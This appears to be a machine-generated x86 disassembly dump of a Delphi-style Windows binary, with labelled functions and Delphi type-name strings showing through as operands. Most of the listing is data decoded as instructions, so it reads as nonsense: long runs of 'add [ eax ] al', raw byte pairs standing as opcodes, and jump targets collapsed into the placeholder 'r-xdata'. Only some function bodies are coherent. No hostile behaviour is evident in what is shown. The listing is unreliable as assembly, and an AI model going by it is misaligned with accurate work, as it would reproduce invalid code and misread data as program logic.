cmp eax 0x43d06c00
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] al
sbb al 0x40
add [ ecx ] al
add [ esi ] al
push esp
popad
jb r-xdata
inc eax
add [ ecx + edx * 8 + 0x43 ] dl
add [ ecx ] dl
push ebp
outsb
push edx
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + ebx * 8 + 0x10042 ] dl
add eax 0x756c6156
add al [ gs : eax ]
add al [ eax ]
add [ es : eax + edx * 8 + 0x55060043 ] bh
xchg esp eax
rol [ ebx ] 0x1
popad
je r-xdata
add [ eax ] al
or [ eax ] al
add al [ eax ]
jo r-xdata
insb
add al [ eax ]
add [ eax ] al
sbb al 0x40
add [ ecx ] al
add [ esi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ eax - 0x24 ] dh
add al [ eax ]
add al [ eax ]
je r-xdata
add [ eax + eax ] bh
pushfd
rol [ ebx ] 0x1
or al 0x55
jo r-xdata
add [ edx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ ecx ] al
add [ eax - 0x24 ] dh
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
nop
je r-xdata
add al [ eax ]
add al [ eax ]
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ edi ] ah
add [ eax + 0x70043d0 ] ah
inc ebp
js r-xdata
add [ edx ] al
push esp
popad
jb r-xdata
push es
popad
je r-xdata
jo r-xdata
add [ esi ] al
push ebp
inc edx
add [ edi ] al
or al 0x54
inc edx
popad
jae r-xdata
imul esi [ gs : bp + di + 0x74 ] 0x68437265
popad
outsb
jae r-xdata
arpl [ ebp + 0x74 ] si
add eax [ gs : eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ ecx ] al
add [ eax - 0x24 ] dh
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
je r-xdata
push esp
popad
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09ffff ] al
outsb
inc ebp
js r-xdata
arpl [ ecx + 0x63 ] ax
je r-xdata
je r-xdata
inc ebx
add ah ah
fadd [ ebx ]
fcomp [ eax + 0x40 ]
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax ] dl
fld [ ebx ]
pushfd
adc eax [ ebx ]
sub bl bl
inc ebx
add ah cl
arpl [ ebp + 0x74 ] si
aam 0x46
add [ eax ] al
add [ eax - 0x80000000 ] al
outsd
outsb
insb
fld [ edx ]
sbb ch dl
inc edx
add [ edx ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
or [ eax ] al
add al [ eax ]
jo r-xdata
add al [ eax ]
add [ eax ] al
sbb al 0x40
add [ ecx ] al
add [ esi ] al
push esp
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ eax - 0x24 ] dh
adc al [ ebx ]
test dh al
inc ebx
add [ eax * 8 - 0x22fbffbd ] ch
popad
je r-xdata
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08ffff ] al
outsb
push ebp
jo r-xdata
jae r-xdata
je r-xdata
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
inc ebx
add al ch
leave
inc ebx
add [ eax ] bl
int 0x43
add [ esi + eax * 8 - 0x3963ffbd ] ah
inc ebx
add [ eax ] ah
int 0x43
add [ eax - 0x29 ] cl
inc ebx
add ah bh

mov [ ebx ] 0x2c
lds eax [ ebx ]
add al 0xdd
js r-xdata
add [ ebx ] al
add [ edx ] al
scasd [ edi ]
fadd [ edx ]
add al [ eax ]
add bl cl
fadd [ edx ]
add al [ eax ]
add bh ch
fadd [ edx ]
add al [ eax ]
add al [ eax ]
sbb ch dl
inc edx
add [ eax + eax ] dh
add bh bh
inc edx
add [ eax ] cl
add bh bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x47ffbd21 ] cl
fld [ edx ]
fiadd [ ss : edx ]
sub_42dcc8
dec [ edi ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
outsd
insd
jo r-xdata
add [ fs : eax ] al
add [ eax - 0x53ffbd33 ] dh
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add al dh
int3
outsb
outsb
je r-xdata
add [ eax ] bl
aad 0x42
add [ eax + eax ] dh
add bh bh
xchg esp eax
rol [ ebx ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esi
inc edx
add [ eax ] al
add bh bh
cmp [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub_42dd5a
inc ebx
add [ eax + ebx * 8 + 0x43 ] bh
add ah ah
fadd [ ebx ]
fcomp [ eax + 0x40 ]
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax ] dl
fld [ ebx ]
pushfd
adc eax [ ebx ]
sub bl bl
inc ebx
add ah cl
adc al [ ebx ]
test dh al
inc ebx
add [ eax * 8 - 0x22fbffbd ] ch
inc ebx
add al ch
leave
inc ebx
add [ eax ] bl
int 0x43
add [ esi + eax * 8 - 0x3963ffbd ] ah
inc ebx
add [ eax ] ah
int 0x43
add [ eax - 0x29 ] cl
inc ebx
add ah bh

sub_42e080
dec [ edx ]
inc esp
jae r-xdata
add [ eax ] al
add [ eax ] dl
inc eax
add [ edx ] al
add [ eax + 0x12 ] al
inc eax
add [ 0x6e656449 ] al
outsb
push ebx
imul edi [ edx + 0x65 ] r-xdata
push cs
push cs
push esp
dec ecx
outsb
je r-xdata
pushfd
adc [ eax ] al
add ecx [ ecx + 0x6e ]
add [ ecx ] al
dec ecx
outsb
je r-xdata
popad
jo r-xdata
rcl [ ecx ] 0x42
add [ 0x6e49540b ] dl
je r-xdata
add [ ebx + 0x42e114c0 ] cl
je r-xdata
add al [ eax ]
add [ eax + edx + 0x49030040 ] ebx
outsb
je r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add al [ eax ]
inc eax
adc al [ eax ]
add eax 0x6e656449
outsb
je r-xdata
outsb
je r-xdata
inc eax
add [ edi ] ch
outsd
dec ecx
outsb
je r-xdata
add [ eax + 0x12 ] eax
inc eax
add [ 0x6e656449 ] al
outsd
loope r-xdata
jns r-xdata
retn 0x8
popad
add al [ gs : bx + si ]
lea eax [ eax ]
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add al [ eax ]
pushfd
adc [ eax ] al
add ecx [ ecx + 0x6e ]
je r-xdata
ror [ ecx + 0x42 ] 0x0
or [ edx ] cl
push esp
push edi
outsb
dec ebp
je r-xdata
add [ ebx + 0x42e14cc0 ] cl
add [ eax ] cl
or dl [ edi + edx * 2 + 0x6e ]
push 0x100646f
adc al [ eax ]
add al 0x0
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] bl
add [ eax ] al
add al [ 0x756c6156 ]
add al [ gs : eax ]
inc eax
adc al [ eax ]
add al 0x0
add [ eax ] al
add al [ esi + ecx * 2 ]
popad
insd
add al [ gs : eax ]
add al [ eax ]
fsubr st0
inc edx
add [ 0x6449540b ] dl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax + eax ] al
je r-xdata
inc eax
adc al [ eax ]
add eax 0x6e656449
add [ ecx ] al
or al 0x50
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_40ab90
pop edi
pop esi
pop ebx
pop ebp
adc [ edi ] eax
dec ebp
jae r-xdata
outsd
add [ fs : ecx ] al
retn 0x8
popad
or [ gs : si + 0x4d ] dl
jae r-xdata
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_40ac8c
pop edi
pop esi
pop ebx
pop ebp
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax + ecx * 8 ] ebx
inc eax
add [ edi ] al
dec ebp
jae r-xdata
popad
add [ gs : si ] bl
enter 0x40 0x2f
sub_42e190
push ebx
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop ebx
retn
sub_42e1b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_40ab90
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_42e1d8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_40ac8c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_42e2df
call [ edi + 0x430042e3 ]
add ah dh
push eax
jecxz r-xdata
add ah dh
dec [ ecx ]
push esp
push edx
inc edi
jb r-xdata
add [ edx ] al
hlt
add eax [ eax ]
jne r-xdata
add ah al
pushad
jne r-xdata
add [ eax + eax ] cl
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x53
insb
add al [ eax ]
add [ esi ] ah
inc edx
add [ ecx ] al
add [ esi ] al
inc edi
jb r-xdata
out 0x42 al
add [ esp + ebp * 8 ] ch
inc edx
add [ esi ] al
inc ebx
jb r-xdata
add al [ eax ]
add al [ eax ]
cmp eax 0x42ee1c00
add [ 0x69676552 ] cl
dec esi
popad
insd
inc edx
xor [ edx ] eax
add [ eax ] al
and al 0xe6
inc edx
add [ edx ] al
add [ esi ] al
inc edi
jb r-xdata
and al 0xe6
inc edx
popad
je r-xdata
add [ edx ] al
add [ 0x61696c41 ] al
jae r-xdata
jb r-xdata
add al [ eax ]
and al 0xe6
insb
popad
jae r-xdata
insb
push ebx
jne r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
and al 0xe6
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah al
pushad
inc edx
add [ edx ] al
add [ esi ] al
inc ecx
inc ebx
insb
popad
jae r-xdata
add [ edx ] bh
add [ edi + ebp * 8 ] al
add [ edx ] al
imul esp [ ecx + 0x73 ] 0x3
add [ eax ] al
or [ eax ] al
add eax [ eax ]
and al 0xe6
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah al
insb
popad
jae r-xdata
pushad
inc edx
add [ ecx ] al
add [ esi ] al
inc ecx
inc ebx
insb
popad
jae r-xdata
jae r-xdata
jae r-xdata
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ edx ] cl
inc ecx
inc ebx
insb
popad
jae r-xdata
xor al [ edx ]
add [ eax ] al
les esp [ eax + 0x42 ]
add [ eax ] cl
add [ esi ] al
inc ecx
inc ebx
insb
popad
jae r-xdata
add al [ eax ]
add al [ eax ]
daa
add [ eax + 0x70042ec ] cl
inc esp
jae r-xdata
insb
add al [ eax ]
add al [ eax ]
aas
add [ edi + ebp * 8 ] bl
inc edx
add [ edi ] cl
push ebp
outsb
jb r-xdata
add al 0x53
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
inc edx
add [ edx ] cl
push edx
imul esi [ gs : bp + di + 0x74 ] 0x64657265
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ edx ] al
add [ esi ] ah
inc edx
imul esp [ ecx + 0x73 ] 0x20002
cmp al [ eax ]
add al 0xef
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
and al 0xe6
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah al
pushad
inc edx
add [ ecx ] al
add [ esi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ esi ] ah
add [ eax ] al
adc [ eax ] al
add al [ eax ]
and al 0xe6
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] ah
cwde
inc edx
add [ eax ] cl
add [ eax + edx * 2 ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ edx ] al
add [ esi ] ah
add al [ gs : eax ]
add al [ eax ]
cmp [ eax ] al
sbb ch ch
inc edx
add [ edx ] cl
inc edi
je r-xdata
add al [ eax ]
add al [ eax ]
cmp [ eax ] al
push eax
jmp r-xdata
add [ eax ] bh
add [ eax - 0x15 ] dl
inc edx
add [ eax ] cl
inc ecx
inc ebx
insb
popad
jae r-xdata
jb r-xdata
int3
add al [ gs : eax ]
add al [ eax ]
lea eax [ eax ]
add al [ eax ]
add al bh
adc [ eax ] al
add [ eax ] eax
push es
dec ebp
outsd
jne r-xdata
insb
imul esi [ bp + di + 0x74 ] 0x6c437265
popad
jae r-xdata
add dl [ edx - 0x1a ]
inc edx
add al [ eax ]
add al [ eax ]
inc edi
add [ edi + ebp * 8 + 0x42 ] bh
add [ edi ] dl
push ebp
outsb
jb r-xdata
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah al
pushad
inc edx
add [ ecx ] al
add [ esi ] al
inc ecx
inc ebx
insb
popad
jae r-xdata
add al [ eax ]
add al [ eax ]
push ecx
add ah cl
out dx al
inc edx
add [ edx ] dl
inc ecx
inc ebx
insb
popad
jae r-xdata
arpl [ edx ] ax
add [ edx ] al
add [ edi ] dh
add al bl
in eax dx
inc edx
add [ edi ] al
dec ecx
outsb
inc edi
jb r-xdata
add [ eax ] cl
add [ edx ] al
add [ esi ] ah
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
add eax [ eax ]
les esp [ eax + 0x42 ]
jae r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
and al 0xe6
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
jns r-xdata
lodsb [ esi ]
push esi
inc eax
jne r-xdata
sub dh ah
inc edx
add [ edi ] al
or [ edx + edx * 2 + 0x65 ] edx
inc edi
jb r-xdata
insb
add al [ eax ]
add ah al
pushad
inc edx
add [ ecx ] al
add [ esi ] al
inc ecx
inc ebx
insb
popad
jae r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
and al 0xe6
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ edx ] al
add [ edx ] al
add [ eax ] al
adc [ eax ] al
adc [ eax ] al
add bh bh
adc [ eax ] al
push edx
out 0x42 al
imul esi [ bp + di + 0x74 ] 0x6f4d7265
jne r-xdata
inc ecx
insb
push edx
imul esi [ gs : bp + di + 0x74 ] 0x6c437265
jne r-xdata
jae r-xdata
or eax 0x69676552
jae r-xdata
add al [ eax ]
add al [ eax ]
cmp al 0x0
enter 0x42ec 0x0
or [ edi + 0x65 ] al
je r-xdata
add [ eax ] al
or [ eax ] al
add [ eax ] eax
and al 0xe6
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
pop ecx
add [ ebx + ebp * 8 + 0x42090042 ] bh
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ esi ] ah
add ah dh
dec [ ecx - 0x17 ]
inc edx
add [ edx ] al
hlt
jne r-xdata
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
insb
loop r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
insb
popad
jae r-xdata
popad
jae r-xdata
imul esi [ ebx + 0x74 ] 0x6c437265
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah al
pushad
inc edx
add [ ecx ] al
add [ esi ] al
inc ecx
inc ebx
insb
popad
jae r-xdata
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ edx ] al
add [ esi ] ah
insb
popad
jae r-xdata
add ah al
pushad
inc edx
inc edi
jb r-xdata
dec ecx
jmp 0x84e79c
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
0xe6cc0042 0x42
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
cmp bh 0xff
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
nop
int3
jae r-xdata
add al [ eax ]
jne r-xdata
sub [ esi + 0x80040 ] ch
add [ eax ] al
add eax 0x636f4c46
imul eax [ edx ] 0x0
add ah al
pushad
inc edx
add [ eax ] ah
add [ eax ] al
add [ esi + eax * 2 ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ ecx + esi * 8 + 0x42 ] bl
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add ah bl
pop edx
inc edx
add [ eax + eax ] al
add [ eax ] al
pop es
inc esi
inc edi
jb r-xdata
jae r-xdata
add [ eax ] al
or [ eax ] al
add al [ eax ]
and al 0xe6
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ esi ] ah
add [ ecx ] al
add [ esi ] al
inc ecx
inc ebx
insb
popad
jae r-xdata
les esp [ eax + 0x42 ]
add ah dh
push [ eax + 0x420042ea ]
add ah dh
dec [ edx ]
push esp
push edx
inc edi
jb r-xdata
add al [ eax ]
add [ eax ] al
lldt [ edi + 0x440042e7 ]
add ah dh
add [ ecx ] al
add [ edx ] al
add al 0x53
insb
jne r-xdata
add [ eax ] eax
or al [ ecx + 0x43 ]
insb
popad
jae r-xdata
add al [ eax ]
add al [ eax ]
inc esp
add [ eax ] cl
int1
inc edx
add [ eax ] cl
inc ecx
inc ebx
insb
popad
jae r-xdata
add al [ eax ]
add ah al
pushad
inc edx
insb
jae r-xdata
inc ebx
insb
popad
jae r-xdata
dec esi
popad
insd
add al [ gs : eax ]
add al [ eax ]
cmp eax [ eax ]
test dl dh
inc edx
add [ ebx ] cl
inc edi
jb r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add eax [ eax ]
clc
0x42 0x5304
add [ ecx + esi * 8 + 0x44070042 ] bl
jae r-xdata
add [ eax ] ch
int1
inc edx
add [ esi ] al
inc ebx
jb r-xdata
popad
jae r-xdata
add al [ eax ]
add ah al
pushad
inc edx
add [ edx ] al
add [ ebx ] cl
inc ecx
inc edi
jb r-xdata
or eax [ ecx + 0x47 ]
jne r-xdata
push ebx
jb r-xdata
popad
je r-xdata
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah al
pushad
inc edx
add [ ecx ] al
add [ esi ] al
inc ecx
inc ebx
insb
popad
jae r-xdata
add al [ eax ]
add al [ eax ]
push ecx
add [ eax ] ah
hlt
jne r-xdata
push edi
imul esi [ eax + ebp * 2 + 0x3 ] 0x4260c400
insb
popad
jae r-xdata
add al [ eax ]
add al [ eax ]
cmp al 0x0
inc eax
inc edx
add [ eax ] cl
inc edi
je r-xdata
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add cl [ ecx + 0x44 ]
add al [ eax ]
add ah al
pushad
inc edx
add [ edx ] al
add [ esi ] al
inc ecx
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add al 0x53
jns r-xdata
add [ ecx ] al
add [ esi ] al
inc ecx
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
les esp [ eax + 0x42 ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
clc
0x42 0x5304
jb r-xdata
add al [ eax ]
add al [ eax ]
cmp al [ eax ]
test ah dh
inc edx
add [ edx ] cl
push ebx
je r-xdata
adc dl [ edx + 0x65 ]
imul esi [ bp + di + 0x74 ] 0x6c437265
inc ebx
insb
popad
jae r-xdata
add [ edx ] al
add [ 0x42f40800 ] bh
add [ 0x69676552 ] cl
jae r-xdata
add al [ eax ]
add al [ eax ]
dec esi
add [ eax ] ch
inc edx
add [ ecx ] cl
inc edi
jb r-xdata
add [ eax ] cl
add [ edx ] al
add al bh
0x42 0x5304
add eax [ eax ]
les esp [ eax + 0x42 ]
insb
popad
jae r-xdata
add [ eax ] al
or [ eax ] al
add [ eax ] eax
clc
0x42 0x5304
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add al bh
inc ebx
insb
popad
jae r-xdata
insb
popad
jae r-xdata
imul esi [ bp + di + 0x74 ] 0x6c437265
jb r-xdata
inc ecx
insb
jb r-xdata
add al [ eax ]
add al [ eax ]
and al 0x0
cld
inc edx
add [ esp + ecx * 2 ] al
outsd
arpl [ ebx + 0x3 ] bp
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add al bh
add [ edx ] al
add [ 0x61696c41 ] al
jae r-xdata
jb r-xdata
push edx
imul esi [ gs : bp + di + 0x74 ] 0x6c437265
jne r-xdata
jo r-xdata
add eax [ eax ]
les esp [ eax + 0x42 ]
add [ eax ] cl
add [ edx ] al
add al bh
0x42 0x5304
jae r-xdata
inc edx
add [ edi ] al
or dl [ edx + edx * 2 + 0x65 ]
inc edi
jb r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
clc
inc edi
jb r-xdata
inc eax
hlt
popad
jae r-xdata
insb
add [ edx ] bh
add [ eax - 0xc ] al
inc edx
add [ edx ] cl
push edx
imul esi [ gs : bp + di + 0x74 ] 0x64657265
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ edx ] al
add al bh
0x42 0x5304
add [ edx ] al
imul esp [ ecx + 0x73 ] 0x3
add [ eax ] al
or [ eax ] al
add eax [ eax ]
clc
0x42 0x5304
popad
jae r-xdata
insb
imul esp [ ecx + 0x73 ] 0x20002
cmp al [ eax ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
clc
0x42 0x5304
imul esi [ ebx + 0x74 ] 0x6c437265
push edi
0x42 0x5304
imul esi [ eax + ebp * 2 + 0x3 ] 0x0
add [ eax ] cl
add [ ebx ] al
add al bh
0x42 0x5304
add [ eax ] al
or [ eax ] al
add al [ eax ]
clc
0x42 0x5304
add [ eax ] al
add [ eax ] al
add [ eax ] cl
or [ esi - 0x7b ] cl
jne r-xdata
add al [ eax ]
jne r-xdata
inc edi
dec esi
jne r-xdata
test ebp ebp
idiv [ eax + edi + 0x46 ]
jae r-xdata
0x42 0x5304
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
clc
0x42 0x5304
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4305a0
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_405894
test al al
je r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_405894
test al al
je r-xdata
add [ edx ] al
add al bh
out 0x42 al
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
je r-xdata
fmul [ ebx + 0x24448bd3 ]
add al 0xe8
std
insb
std
inc [ eax + eax * 8 - 0x127aec8c ]
jae r-xdata
add [ ecx ] al
add [ edx ] al
daa
jmp r-xdata
push esp
and al 0x4
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor edi edi
inc esi
sub_42eb5c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4305a0
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_405894
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_405894
test al al
je r-xdata
sub_42ebbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_42eb5c
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42eb5c
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_405894
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_42ec2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4055c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_4303e0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_42ec88
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
mov eax [ esi + 0x4 ]
call sub_4055f0
mov eax [ esi + 0x8 ]
call sub_4055f0
mov eax [ esi + 0xc ]
call sub_4055f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_42ecc8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov esi eax
test esi esi
jl r-xdata
xor eax eax
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov esi eax
test esi esi
jl r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42ed18
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov ebx eax
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
dec ebx
jne r-xdata
sub_42ed60
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42edc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
or esi 0xffffffff
lea edx [ ebp - 0x4 ]
mov eax edi
call sub_4054c8
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42edce
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov edx esi
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp edi eax
je r-xdata
or esi 0xffffffff
jmp r-xdata
sub_42edd8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
